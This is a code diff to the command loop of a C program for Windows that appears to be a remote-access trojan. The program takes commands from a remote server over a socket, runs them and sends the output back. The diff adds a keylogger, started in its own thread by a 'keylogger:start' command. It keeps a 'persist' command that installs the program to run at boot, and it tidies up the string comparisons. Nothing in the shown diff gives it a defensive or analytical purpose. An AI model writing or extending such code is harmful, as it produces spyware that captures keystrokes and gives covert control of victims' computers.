@@ -1,9 +1,11 @@
 #include "status.h"
+#include "logger.h"
 #include "str_cut.h"
+
+#include <winsock2.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <winsock2.h>
 #include <Windows.h>
 #include <WinUser.h>
 #include <wininet.h>
@@ -79,20 +81,24 @@ void Shell()
     // Receive command from server
     recv(sock, buffer, 1024, 0);
 
-    if (strncmp("q", buffer, 1) == 0) // Use strncmp for comparing a specific number of characters
+    if (strcmp("q", buffer) == 0) // Use strncmp for comparing a specific number of characters
     {
       // info("Quitting Connection..");
       closesocket(sock);
       WSACleanup();
       exit(0);
     }
-    else if (strncmp("start:keylogger", buffer, sizeof("start:keylogger")) == 0)
+    else if (strcmp("keylogger:start", buffer) == 0)
     {
-      info("Starting Keylogger..");
+      // info("Starting Keylogger..");
 
-      // IMPLEMENT KEYLOGGER
+      // Create a thread to run logger
+      HANDLE thread = CreateThread(NULL, 0, logger, NULL, 0, NULL);
+
+      // Continue listening for commands
+      continue;
     }
-    else if (strcmp("cd ", buffer, sizeof("cd ")) == 0)
+    else if (strncmp("cd ", buffer, 3) == 0)
     {
       // Get the directory from the original buffer
       char *str = str_cut(buffer, 3, 100);
@@ -103,7 +109,7 @@ void Shell()
       // Send response
       send(sock, "Directory changed.", sizeof("Directory changed."), 0);
     }
-    else if (strcmp("persist", buffer, sizeof("persist")) == 0)
+    else if (strncmp("persist", buffer, 7) == 0)
     {
       // Persist connection
       bootRun();
@@ -119,6 +125,7 @@ void Shell()
       }
 
       // Send the response to the server
+      printf("%s", total_response);
       send(sock, total_response, sizeof(total_response), 0);
 
       // Close fp
